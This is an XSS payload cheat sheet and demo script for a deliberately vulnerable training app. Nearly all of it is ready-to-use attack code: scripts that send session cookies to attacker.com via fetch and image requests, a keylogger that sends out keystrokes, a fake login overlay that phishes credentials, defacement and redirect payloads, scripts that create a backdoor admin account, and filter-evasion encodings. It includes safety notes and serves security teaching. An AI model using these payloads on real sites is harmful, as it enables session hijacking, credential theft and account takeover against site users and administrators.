# 🎯 XSS Payload Cheat Sheet

Quick reference for XSS payloads to use during your demo.

## Basic Alert Payloads

### Simple Script Tag
```html
<script>alert('XSS')</script>
```

### Image Tag with onerror
```html
<img src=x onerror=alert('XSS')>
```

### SVG onload
```html
<svg/onload=alert('XSS')>
```

### Iframe with JavaScript Protocol
```html
<iframe src="javascript:alert('XSS')"></iframe>
```

## Cookie Stealing Payloads

### Show Cookie in Alert
```html
<script>alert(document.cookie)</script>
```

### Image onerror with Cookie
```html
<img src=x onerror=alert(document.cookie)>
```

### Detailed Cookie Display
```html
<script>alert('Your session cookie:\n\n' + document.cookie)</script>
```

## Advanced Attack Payloads

### Send Cookie to Attacker Server
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### Alternative with Image Request
```html
<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
```

### POST Cookie to Attacker
```html
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: window.location.href,
    user: 'compromised'
  })
});
</script>
```

## Visual Impact Payloads

### Deface the Page
```html
<script>
document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:100px;">HACKED!</h1>';
</script>
```

### Redirect to Malicious Site
```html
<script>window.location='http://evil.com';</script>
```

### Overlay Fake Login Form
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;">
  <h2>Session Expired - Please Login Again</h2>
  <form action="http://attacker.com/phish" method="POST">
    <input name="username" placeholder="Username"><br>
    <input name="password" type="password" placeholder="Password"><br>
    <button type="submit">Login</button>
  </form>
</div>
```

## Demo-Specific Payloads

### For Search Page (`/search`)
```
?q=<script>alert('Reflected XSS in Search')</script>
?q=<img src=x onerror=alert(document.cookie)>
?q=<svg/onload=alert('Search XSS')>
```

### For Feedback Page (Stored XSS)
```html
<script>alert('Stored XSS - Affects Everyone!')</script>
```

```html
<script>
alert('This XSS persists in the database and executes for ALL users who view this page!');
</script>
```

```html
<img src=x onerror="alert('Admin cookie: ' + document.cookie)">
```

## Admin-Specific Attack Payloads

### Steal Admin Session
```html
<script>
if(document.cookie.includes('session')) {
  fetch('http://attacker.com/admin-cookie', {
    method: 'POST',
    body: document.cookie
  });
}
</script>
```

### Create Backdoor Admin Account (if CSRF vulnerable)
```html
<script>
fetch('/admin/create-user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=backdoor&email=back@door.com&password=secret123&full_name=Backdoor&is_admin=1'
});
</script>
```

### Grant Admin to Attacker's Account
```html
<script>
// Assuming attacker's user ID is 2
fetch('/admin/toggle-admin/2', {method: 'POST'});
</script>
```

## Bypassing Filters (Not needed in this app)

These are just for educational reference if filters existed:

### Case Variation
```html
<ScRiPt>alert('XSS')</sCrIpT>
```

### HTML Encoding
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

### URL Encoding
```
%3Cscript%3Ealert('XSS')%3C/script%3E
```

### Mixed Techniques
```html
<img src=x OnErRoR=alert`XSS`>
```

## Demo Script with Payloads

### Act 1: Basic Reflected XSS
1. Login as Alice
2. Go to Search
3. Search for: `<script>alert('XSS')</script>`
4. Show the alert
5. Explain: "User input is directly rendered without sanitization"

### Act 2: Cookie Theft
1. Still on search
2. Search for: `<img src=x onerror=alert(document.cookie)>`
3. Show the cookie in alert
4. Explain: "This is the session cookie. An attacker could send this to their server"
5. Show payload that would send to attacker:
   ```
   <img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
   ```

### Act 3: Stored XSS
1. Navigate to Feedback
2. Submit: `<script>alert('This affects EVERYONE!')</script>`
3. Show alert fires
4. Logout
5. Login as Bob
6. Go to Feedback
7. Show alert fires for Bob too
8. Explain: "Stored in database, executes for all users"

### Act 4: Admin Compromise
1. Login as regular user
2. Submit feedback: `<img src=x onerror=alert('If admin sees this, their cookie: ' + document.cookie)>`
3. Logout
4. Login as admin
5. View feedback page
6. XSS executes with admin's session
7. Explain: "Attacker now has admin's session cookie"
8. Explain: "Could create backdoor accounts, steal data, etc."

## Safety Notes

⚠️ **Never use these payloads on websites you don't own or don't have permission to test!**

These payloads are for:
- ✅ This demo application
- ✅ Your own test applications
- ✅ Authorized penetration testing
- ✅ Security training environments

Not for:
- ❌ Real production websites
- ❌ Websites without permission
- ❌ Malicious purposes
- ❌ Testing in production

## Clean Payloads for Screenshots

Sometimes you want to show XSS without actually triggering it:

### HTML Entity Encoded (won't execute)
```
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### In Comments
```html
<!-- <script>alert('XSS')</script> -->
```

### As Plain Text
```
Plain text: <script>alert('XSS')</script>
```

## Testing Your Own Applications

To test if your application is vulnerable to XSS:

1. **Input Fields**: Try entering scripts in all input fields
2. **URL Parameters**: Modify query strings with XSS payloads
3. **Headers**: Test user-agent, referer, etc.
4. **File Uploads**: Try uploading HTML files with scripts
5. **JSON/XML**: Test API endpoints with script payloads

## Quick Reference Table

| Payload Type | Use Case | Example |
|-------------|----------|---------|
| Basic Alert | Initial test | `<script>alert('XSS')</script>` |
| Cookie Theft | Show session exposure | `<img src=x onerror=alert(document.cookie)>` |
| Exfiltration | Send to attacker | `<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">` |
| Defacement | Visual impact | `<script>document.body.innerHTML='HACKED'</script>` |
| Phishing | Credential theft | Fake login form overlay |
| Keylogger | Capture inputs | `<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>` |

## Resources

- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [XSS Game by Google](https://xss-game.appspot.com/)

---

**Remember**: Use these responsibly and ethically! 🛡️
